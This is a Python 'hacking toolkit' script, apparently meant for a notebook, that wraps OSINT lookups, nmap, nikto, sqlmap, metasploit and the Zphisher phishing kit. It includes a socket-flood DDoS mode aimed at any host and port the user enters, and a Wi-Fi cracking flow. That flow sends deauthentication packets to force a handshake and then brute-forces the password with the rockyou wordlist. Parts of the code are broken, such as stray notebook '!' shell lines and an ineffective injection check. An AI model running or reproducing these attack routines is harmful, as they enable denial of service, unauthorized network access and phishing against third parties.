import requests
import socket
import whois
import dns.resolver
import subprocess
import os
import json
from datetime import datetime
import time
import sys
import string
from urllib.parse import urlparse
import csv
import signal

USE_COLOR = True  # set to False for plain text

CYAN = "\033[96m" if USE_COLOR else ""
GREEN = "\033[92m" if USE_COLOR else ""
RESET = "\033[0m" if USE_COLOR else ""

logo = fr"""
{CYAN}

  ░██████            ░██        ░██   ░██
 ░██   ░██           ░██              ░██
░██     ░██ ░██░████ ░████████  ░██░████████
░██     ░██ ░███     ░██    ░██ ░██   ░██
░██     ░██ ░██      ░██    ░██ ░██   ░██
 ░██   ░██  ░██      ░███   ░██ ░██   ░██
  ░██████   ░██      ░██░█████  ░██    ░████




{RESET}
{GREEN}           NETWORK SECURITY TOOLKIT{RESET}
"""

print(logo)


# ================= BUFFER =================
report = []
confidence = 0

def write(text):
    print(text)
    report.append(text)

def reset_session():
    global report, confidence
    report = []
    confidence = 0

def add_confidence(points):
    global confidence
    confidence += points

# Helper function from original DDoS script, though not directly used in new menu flow
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

curdir = os.getcwd()

# ================= OSINT TOOLS =================

def ip_lookup(target):
    write("[IP GEOLOCATION]")
    try:
        data = requests.get(f"http://ip-api.com/json/{target}").json()

        usable_keys = ["country", "regionName", "city", "isp", "org", "as", "lat", "lon"]
        for k in usable_keys:
            if k in data and data[k]:
                write(f"{k}: {data[k]}")
                add_confidence(1)
    except requests.exceptions.RequestException as e:
        write(f"IP Geolocation lookup failed: {e}")

def reverse_dns(target):
    write("\n[REVERSE DNS]")
    try:
        host = socket.gethostbyaddr(target)
        write(f"Hostname: {host[0]}")
        add_confidence(2)
    except socket.herror:
        write("No reverse DNS found")
    except Exception as e:
        write(f"Reverse DNS lookup failed: {e}")

def dns_lookup(domain):
    write("\n[DNS RECORDS]")
    found = False
    for rtype in ["A", "AAAA", "MX", "NS", "TXT"]:
        try:
            records = dns.resolver.resolve(domain, rtype)
            write(f"{rtype}:")
            for r in records:
                write(f" - {r}")
            found = True
            add_confidence(1)
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.NoNameservers):
            pass
        except Exception as e:
            write(f"Error resolving {rtype} for {domain}: {e}")
    if not found:
        write("No useful DNS records found")

def whois_lookup(target):
    write("\n[WHOIS]")
    try:
        data = whois.whois(target)
        for k, v in data.items():
            if not v:
                continue
            text = str(v).lower()
            if "redacted" in text or "privacy" in text:
                continue
            write(f"{k}: {v}")
            add_confidence(1)
    except Exception as e:
        write(f"WHOIS lookup failed: {e}")

def rdap_lookup(domain):
    write("\n[RDAP]")
    try:
        r = requests.get(f"https://rdap.org/domain/{domain}", timeout=5)
        r.raise_for_status() # Raise an exception for HTTP errors
        data = r.json()

        if "ldhName" in data:
            write(f"Domain: {data['ldhName']}")
            add_confidence(1)

        if "nameservers" in data:
            write("Nameservers:")
            for ns in data["nameservers"]:
                write(f" - {ns.get('ldhName')}")
            add_confidence(1)

        if "events" in data:
            for e in data["events"]:
                if e.get("eventAction") in ["registration", "expiration"]:
                    write(f"{e['eventAction']}: {e['eventDate']}")
                    add_confidence(1)
    except requests.exceptions.RequestException as e:
        write(f"RDAP lookup failed: {e}")
    except Exception as e:
        write(f"RDAP lookup failed: {e}")

def reverse_ip(target):
    write("\n[REVERSE IP]")
    try:
        ip = socket.gethostbyname(target)
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=5)
        r.raise_for_status()

        if "error" in r.text.lower():
            write("Reverse IP lookup unavailable or error from service.")
            return

        domains = r.text.strip().splitlines()
        if domains:
            write("Domains on same IP:")
            for d in domains[:20]: # Limit output to 20 domains for readability
                write(f" - {d}")
            add_confidence(2)
        else:
            write("No domains found on this IP.")
    except requests.exceptions.RequestException as e:
        write(f"Reverse IP lookup failed: {e}")
    except socket.gaierror:
        write(f"Could not resolve hostname for target: {target}")
    except Exception as e:
        write(f"Reverse IP lookup failed: {e}")

def http_headers(target):
    write("\n[HTTP HEADERS]")
    try:
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target
        r = requests.get(target, timeout=5, allow_redirects=True)
        r.raise_for_status()
        for k, v in r.headers.items():
            write(f"{k}: {v}")
        add_confidence(1)
    except requests.exceptions.MissingSchema:
        write(f"Invalid URL scheme or format for {target}")
    except requests.exceptions.RequestException as e:
        write(f"HTTP header grab failed: {e}")
    except Exception as e:
        write(f"HTTP header grab failed: {e}")

def traceroute(target):
    write("\n[TRACEROUTE]")
    cmd = ["tracert", target] if os.name == "nt" else ["traceroute", target]
    try:
        # Ensure target is valid IP/domain to avoid command injection with subprocess
        if not (socket.gethostbyname(target) or target.replace('.', '').isdigit()):
            write("Invalid target for traceroute.")
            return

        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = proc.communicate()

        if stdout:
            write(stdout.strip())
            add_confidence(1)
        if stderr:
            write("Traceroute Errors:")
            write(stderr.strip())

    except FileNotFoundError:
        write("Traceroute command not found. Please ensure it's installed and in your PATH.")
    except socket.gaierror:
        write(f"Could not resolve hostname for traceroute target: {target}")
    except Exception as e:
        write(f"Traceroute failed: {e}")

# ================= OSINT MODE =================

def osint_mode(target):
    write("=== OSINT MODE START ===\n")

    ip_lookup(target)

    if target.replace(".", "").isdigit(): # Check if target is likely an IP address
        reverse_dns(target)
    else:
        dns_lookup(target)
        rdap_lookup(target)
        reverse_ip(target)
        http_headers(target)

    whois_lookup(target)

    write("\n=== OSINT MODE END ===")
    write(f"\n[CONFIDENCE SCORE]: {confidence}/20")

# ================= NMAP SCAN =================

def nmap_scan(target):
    write("\n[NMAP SCAN]")
    print("Choose Nmap scan type:")
    print("1) Default Scan (SYN scan -sS)")
    print("2) Version Detection (-sV)")
    print("3) OS Detection (-O)")
    print("4) Aggressive Scan (-A)")
    print("5) Custom Options (e.g., -p 1-1000 -T4)")
    scan_choice = input("Enter choice (1-5): ").strip()

    nmap_args = []
    if scan_choice == '1':
        nmap_args = ["-sS"]
        write("Performing default SYN scan...")
    elif scan_choice == '2':
        nmap_args = ["-sV"]
        write("Performing version detection scan...")
    elif scan_choice == '3':
        nmap_args = ["-O"]
        write("Performing OS detection scan...")
    elif scan_choice == '4':
        nmap_args = ["-A"]
        write("Performing aggressive scan...")
    elif scan_choice == '5':
        custom_options_str = input("Enter custom Nmap options (e.g., -p 80,443 -T4): ").strip()
        if custom_options_str:
            nmap_args = custom_options_str.split()
            write(f"Performing custom Nmap scan with options: {custom_options_str}...")
        else:
            write("No custom options entered, performing default SYN scan.")
            nmap_args = ["-sS"]
    else:
        write("Invalid Nmap scan choice, performing default SYN scan.")
        nmap_args = ["-sS"]

    cmd = ["nmap", target] + nmap_args
    write(f"Running Nmap command: {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, check=False)

        write("\n--- Nmap Output ---")
        if proc.stdout:
            write(proc.stdout.strip())
        else:
            write("No standard output from Nmap.")

        if proc.stderr:
            write("\n--- Nmap Errors ---")
            write(proc.stderr.strip())
            add_confidence(-1) # Deduct confidence for Nmap errors

        if "Nmap done: 1 IP address (1 host up)" in proc.stdout:
            write("Nmap reported host as up and potentially found services.")
            add_confidence(3)
        elif "Nmap done: 1 IP address (0 hosts up)" in proc.stdout:
            write("Nmap reported host as down or unreachable.")
        elif "Ports scanned" in proc.stdout:
            write("Nmap completed a port scan.")
            add_confidence(2)
        else:
            add_confidence(1) # Some output is better than none

    except FileNotFoundError:
        write("Nmap command not found. Please ensure Nmap is installed and in your system's PATH.")
    except Exception as e:
        write(f"An unexpected error occurred during Nmap scan: {e}")

# ================= NIKTO SCAN =================

def nikto_scan(target):
    write("\n[NIKTO SCAN]")
    try:
        # Nikto requires a full URL or hostname
        if not target.startswith("http://") and not target.startswith("https://"):
            target = "http://" + target # Default to http if no scheme specified

        # Ensure Nikto is run with the host parameter
        cmd = ["nikto", "-h", target]
        write(f"Running Nikto command: {' '.join(cmd)}")

        proc = subprocess.run(cmd, capture_output=True, text=True, check=False)

        write("\n--- Nikto Output ---")
        if proc.stdout:
            write(proc.stdout.strip())
            # Basic heuristic for confidence: Nikto typically finds something if successful
            if "0 host(s) tested" not in proc.stdout and "No web server found" not in proc.stdout:
                add_confidence(3)
        if proc.stderr:
            write("\n--- Nikto Errors ---")
            write(proc.stderr.strip())
            # Nikto often prints informational messages to stderr, so not always an error
            if "ERROR" in proc.stderr.upper() or "FAILED" in proc.stderr.upper():
                add_confidence(-1)

    except FileNotFoundError:
        write("Nikto command not found. Please ensure Nikto is installed and in your system's PATH.")
    except Exception as e:
        write(f"An unexpected error occurred during Nikto scan: {e}")

# ================= DDOS FUNCTIONALITY =================

def dos(host, ip, port, message_bytes):
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((ip, int(port)))
        ddos.send(message_bytes)
        ddos.send(message_bytes)
        write(f"|[DDoS Packet Sent ({len(message_bytes)} bytes) to {host}:{port}]|")
        add_confidence(0.5)
    except socket.error as msg:
        write(f"|[Connection Failed to {host}:{port}]| - {msg}")
    except Exception as e:
        write(f"|[Error sending DDoS packet to {host}:{port}]| - {e}")
    finally:
        ddos.close()

def ddos_mode():
    write("=== DDoS MODE START ===")
    while True:
        host_input = input("Site you want to target (e.g., example.com or http://example.com): ").strip()
        port_str = input("Port you want to attack (e.g., 80): ").strip()
        message_content = input("Input the message content (e.g., 'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n'): ").strip()
        message_length_str = input("Desired message length in bytes (optional, leave blank to use content length): ").strip()
        conn_str = input("How many connections/packets you want to attempt: ").strip()

        if not host_input or not port_str.isdigit() or not conn_str.isdigit():
            write("Invalid input. Please provide a valid host, port (number), and number of connections (number).")
            continue

        port = int(port_str)
        num_connections = int(conn_str)

        final_message = message_content.encode()
        if message_length_str.isdigit():
            desired_length = int(message_length_str)
            current_length = len(final_message)
            if current_length < desired_length:
                # Pad with null bytes or spaces to reach desired length
                padding = b'\x00' * (desired_length - current_length)
                final_message = final_message + padding
                write(f"Message padded to {len(final_message)} bytes.")
            elif current_length > desired_length:
                # Truncate message
                final_message = final_message[:desired_length]
                write(f"Message truncated to {len(final_message)} bytes.")

        try:
            parsed_url = urlparse(host_input)
            host = parsed_url.hostname if parsed_url.hostname else host_input

            ip = socket.gethostbyname(host)
            write(f"Target resolved to IP: {ip}")
            write(f"Attempting {num_connections} connections to {host} on port {port} with message size {len(final_message)} bytes.")
            write("+----------------------------+")

            for i in range(num_connections):
                dos(host, ip, port, final_message)
                time.sleep(0.01)

            write("+----------------------------+")
            write(f"The requested {num_connections} connections finished, sending {num_connections * len(final_message)} bytes in total.")
            add_confidence(5)

        except socket.gaierror:
            write(f"Could not resolve hostname: {host_input}. Please check the domain or IP address.")
        except Exception as e:
            write(f"An unexpected error occurred during DDoS mode operation: {e}")

        answer = input("Do you want to send more connections? (y/n):").strip().lower()
        if answer not in ["y", "yes"]:
            break
    write("=== DDoS MODE END ===")

# ================= WI-FI AUDITING FUNCTIONALITY =================

ROCKYOU_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
OUTPUT_PREFIX = "wifi_scan"

def download_wordlist():
    if not os.path.exists("rockyou.txt"):
        write("[*] Downloading rockyou.txt...")
        # Use !curl for Colab shell command execution
        subprocess.run(f"curl -L {ROCKYOU_URL} -o {curdir}/rockyou.txt", shell=True)
    return f"{curdir}/rockyou.txt"

def cleanup_old_files():
    write("[*] Cleaning up old capture files...")
    for f in os.listdir(curdir):
        if f.startswith(OUTPUT_PREFIX) and (f.endswith('.csv') or f.endswith('.kismet.csv')):
            os.remove(f)
            write(f"Removed {f}")
        if f.startswith('capture-') and f.endswith('.cap'):
            os.remove(f)
            write(f"Removed {f}")

def list_interfaces():
    write("[*] Listing available network interfaces...")
    try:
        # Using subprocess to run airmon-ng and capture output
        proc = subprocess.run("sudo airmon-ng", capture_output=True, text=True, shell=True, check=True)
        write(proc.stdout)
        return proc.stdout # Return output for user to see interfaces
    except subprocess.CalledProcessError as e:
        write(f"Error listing interfaces: {e.stderr}")
        return None
    except FileNotFoundError:
        write("airmon-ng command not found. Please ensure aircrack-ng suite is installed.")
        return None

def get_targets(interface):
    """Scans for 10 seconds and parses the BSSIDs and Channels."""
    write(f"[*] Scanning for 10 seconds on {interface}... Please wait.")

    csv_path = f"{OUTPUT_PREFIX}-01.csv"
    # Remove existing scan files to ensure clean capture
    for f in os.listdir(curdir):
        if f.startswith(OUTPUT_PREFIX) and (f.endswith('.csv') or f.endswith('.kismet.csv')):
            os.remove(f)

    # Run airodump-ng in the background and kill it after 10 seconds
    # Using 'timeout' command for safety and reliability.
    cmd = f"sudo timeout 10 airodump-ng --write {OUTPUT_PREFIX} --output-format csv {interface}"
    subprocess.run(cmd, shell=True)

    targets = []
    if os.path.exists(csv_path):
        with open(csv_path, mode='r') as f:
            reader = csv.reader(f)
            for row in reader:
                # Wi-Fi networks in the CSV start after the BSSID header
                if len(row) >= 14 and row[0].count(':') == 5: # Basic check for BSSID format
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()
                    if essid: # Only add if it has a name
                        targets.append({"bssid": bssid, "channel": channel, "essid": essid})
    return targets

def wifi_audit_mode():
    write("=== WI-FI AUDIT MODE START ===")
    cleanup_old_files()
    wordlist = download_wordlist()

    # 1. Select Interface
    list_interfaces()
    iface = input("\nEnter your wireless interface (e.g., wlan0): ").strip()

    write(f"[*] Starting monitor mode on {iface}...")
    try:
        # Ensure airmon-ng is run with sudo
        start_mon_proc = subprocess.run(f"sudo airmon-ng start {iface}", shell=True, capture_output=True, text=True)
        write(start_mon_proc.stdout)
        write(start_mon_proc.stderr)
        # Extract monitor interface name, typically ends with 'mon'
        mon_iface_line = [line for line in start_mon_proc.stdout.splitlines() if "(monitor mode enabled on" in line]
        if mon_iface_line:
            mon_iface = mon_iface_line[0].split('(')[0].strip().split()[-1]
            write(f"Monitor interface detected: {mon_iface}")
        else:
            mon_iface = input("Could not automatically detect monitor interface. Please enter it (e.g., wlan0mon): ").strip()

    except subprocess.CalledProcessError as e:
        write(f"Error starting monitor mode: {e.stderr}")
        write("Exiting Wi-Fi Audit Mode.")
        return
    except FileNotFoundError:
        write("airmon-ng command not found. Please ensure aircrack-ng suite is installed.")
        write("Exiting Wi-Fi Audit Mode.")
        return

    # 2. Scan and Pick Target
    targets = get_targets(mon_iface)
    if not targets:
        write("No Wi-Fi networks found. Exiting Wi-Fi Audit Mode.")
        # Stop monitor mode before exiting
        subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)
        return

    write("\nID  |  BSSID              | CH | ESSID (Name)")
    write("-" * 50)
    for i, t in enumerate(targets):
        write(f"{i:<3} | {t['bssid']} | {t['channel']:<2} | {t['essid']}")

    try:
        choice = int(input("\nEnter the ID of the network to crack: ").strip())
        target = targets[choice]
    except (ValueError, IndexError):
        write("Invalid choice. Exiting Wi-Fi Audit Mode.")
        # Stop monitor mode before exiting
        subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)
        return

    # 3. Capture & Deauth
    write(f"[*] Target locked: {target['essid']} on Channel {target['channel']}")
    add_confidence(2)

    # Start Sniffer
    capture_file = "capture"
    sniff_cmd = f"sudo airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {capture_file} {mon_iface}"
    write(f"[*] Starting packet capture: {sniff_cmd}")
    sniff_proc = subprocess.Popen(sniff_cmd, shell=True, preexec_fn=os.setsid) # Use os.setsid to create a new process group

    # Give the sniffer a second to warm up, then Deauth
    time.sleep(5) # Increased sleep to ensure airodump-ng starts capturing
    write("[!] Sending Deauth to force handshake... (5 packets)")
    deauth_cmd = f"sudo aireplay-ng -0 5 -a {target['bssid']} {mon_iface}"
    subprocess.run(deauth_cmd, shell=True)
    add_confidence(3)

    write("\n[!] Airodump-ng is running in the background. Look for 'WPA Handshake' in its output.")
    write("\n[!] Press Ctrl+C in THIS CELL to stop packet capture and start cracking.")
    try:
        # Keep the script running to allow user to monitor airodump-ng output
        # and press Ctrl+C when handshake is captured.n
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        write("\n[!] Ctrl+C detected. Stopping packet capture...")
        os.killpg(os.getpgid(sniff_proc.pid), signal.SIGTERM) # Terminate the process group
        sniff_proc.wait()

    # Stop monitor mode
    write(f"[*] Stopping monitor mode on {mon_iface}...")
    subprocess.run(f"sudo airmon-ng stop {mon_iface}", shell=True)

    # 4. Crack
    cap_file_path = f"{capture_file}-01.cap"
    if os.path.exists(cap_file_path):
        write(f"\n[*] Starting crack attempt on {target['essid']} using {wordlist}... ")
        crack_cmd = f"sudo aircrack-ng -w {wordlist} -b {target['bssid']} {cap_file_path}"
        crack_proc = subprocess.run(crack_cmd, shell=True, capture_output=True, text=True)
        write(crack_proc.stdout)
        write(crack_proc.stderr)
        if "KEY FOUND!" in crack_proc.stdout:
            write("\n[!!!] WE GOT THE PASSWORD! CHECK ABOVE [!!!]")
            add_confidence(10)
        else:
            write("\n[i] Password not found in wordlist.")
            add_confidence(-5)
    else:
        write(f"Error: Capture file {cap_file_path} not found. Handshake might not have been captured.")
        add_confidence(-2)

    write("=== WI-FI AUDIT MODE END ===")

# ================= SQLMAP =================

def sqlmap_scan():
    write("\n[SQLMAP SCAN]")
    target_url = input("Enter target URL for SQLMap scan (e.g., http://example.com/vuln?id=1): ").strip()

    if not target_url:
        write("Target URL cannot be empty. Returning to menu.")
        return

    custom_options_str = input("Enter custom SQLMap options (e.g., --dbs --level 5 --risk 3): ").strip()
    custom_options = custom_options_str.split() if custom_options_str else []

    write(f"Running SQLMap scan against: {target_url}")
    write(f"With custom options: {' '.join(custom_options)}")
    try:
        # -u specifies the target URL
        # --batch means never ask for user input, use default behavior
        # --random-agent to use a random User-Agent header
        cmd = ["sqlmap", "-u", target_url, "--batch", "--random-agent"] + custom_options
        subprocess.run(cmd, check=True, text=True)
        write("SQLMap scan completed.")
        add_confidence(7)
    except FileNotFoundError:
        write("Error: 'sqlmap' command not found. Please ensure SQLMap is installed and in your PATH.")
        add_confidence(-5)
    except subprocess.CalledProcessError as e:
        write(f"Error running SQLMap: {e}")
        write(f"SQLMap output (stderr): {e.stderr})")
        write(f"SQLMap output (stdout): {e.stdout})")
        add_confidence(-3)
    except Exception as e:
        write(f"An unexpected error occurred during SQLMap scan: {e}")

# ================= METASPLOIT FUNCTION =================

def metasploit_mode():
    write("\n[METASPLOIT MODE]")
    write("Launching msfconsole. This may take a moment...")
    !msfconsole
    try:
        subprocess.run(["msfconsole"], check=False)
        write("msfconsole session ended.")
        add_confidence(5)
    except FileNotFoundError:
        write("Error: 'msfconsole' command not found. Please ensure Metasploit Framework is installed and in your PATH.")
        add_confidence(-5)
    except Exception as e:
        write(f"An unexpected error occurred while launching msfconsole: {e}")
        add_confidence(-3)


# ================= EXPORT =================

def export_report():
    if not report:
        print("Nothing to export.")
        return

    name = input("Filename (no extension):").strip()
    fmt = input("Format (txt/json):").lower()

    if not name:
        print("Filename cannot be empty. Aborting export.")
        return

    try:
        if fmt == "json":
            data = {
                "generated": datetime.now().isoformat(),
                "confidence_score": confidence,
                "report": report
            }
            with open(name + ".json", "w") as f:
                json.dump(data, f, indent=4)
        else:
            with open(name + ".txt", "w") as f:
                f.write("\n".join(report))
        print("Report exported successfully.")
    except IOError as e:
        print(f"Error exporting report: {e}")
    except Exception as e:
        print(f"An unexpected error occurred during report export: {e}")

def zphisher_mode():
    write("\n[ZPHISHER MODE]")
    write("Launching Zphisher. You will interact with Zphisher directly.")
    # Change to the zphisher directory
    zphisher_dir = os.path.join(curdir, "zphisher")
    if not os.path.isdir(zphisher_dir):
        write(f"Error: Zphisher directory not found at {zphisher_dir}")
        add_confidence(-5)
        return

    original_dir = os.getcwd()
    try:
        os.chdir(zphisher_dir)
        write(f"Changed directory to {os.getcwd()}")

        # Make the script executable if it's not already
        !chmod +x zphisher.sh

        # Run the zphisher script
        !./zphisher.sh
        write("Zphisher session ended.")
        add_confidence(5)
    except FileNotFoundError:
        write("Error: 'zphisher.sh' script not found or dependencies missing. Ensure Zphisher is properly installed.")
        add_confidence(-5)
    except subprocess.CalledProcessError as e:
        write(f"Error running Zphisher: {e.stderr}")
        add_confidence(-3)
    except Exception as e:
        write(f"An unexpected error occurred while launching Zphisher: {e}")
        add_confidence(-3)
    finally:
        os.chdir(original_dir)
        write(f"Returned to original directory: {os.getcwd()}")

# ================= MENU =================

# Update the menu to include Zphisher
def menu():
    print("\nOrbit Hacking Tools Made by Ajay Easwarachandran")
    print("1) OSINT Mode")
    print("2) Nmap Scan")
    print("3) Nikto Scan")
    print("4) DDoS Mode")
    print("5) Wi-Fi Audit Mode")
    print("6) SQLMap Scan")
    print("7) Metasploit")
    print("8) Phishing Mode") # New option
    print("9) Export Report")
    print("0) Exit")

# Update the main loop to handle the new option
while True:
    menu()
    choice = input("Select option: ").strip()

    if choice == "0":
        write("Exiting Orbit Network Tools.")
        break

    # Reset session for new tool modes, but not for export
    if choice not in ["9", "0"]:
        reset_session()

    if choice == "1":
        target = input("Enter IP or domain for OSINT: ").strip()
        if target:
            osint_mode(target)
        else:
            write("Target cannot be empty. Returning to menu.")
    elif choice == "2":
        target = input("Enter IP or domain for Nmap scan: ").strip()
        if target:
            nmap_scan(target)
        else:
            write("Target cannot be empty. Returning to menu.")
    elif choice == "3":
        target = input("Enter URL or domain for Nikto scan: ").strip()
        if target:
            nikto_scan(target)
        else:
            write("Target cannot be empty. Returning to menu.")
    elif choice == "4":
        ddos_mode()
    elif choice == "5":
        wifi_audit_mode()
    elif choice == "6":
        sqlmap_scan()
    elif choice == "7":
        metasploit_mode()
    elif choice == "8": # New Zphisher option
        zphisher_mode()
    elif choice == "9": # Export Report option moved to 9
        export_report()
    else:
        write("Invalid option. Choose from the menu dingus.")
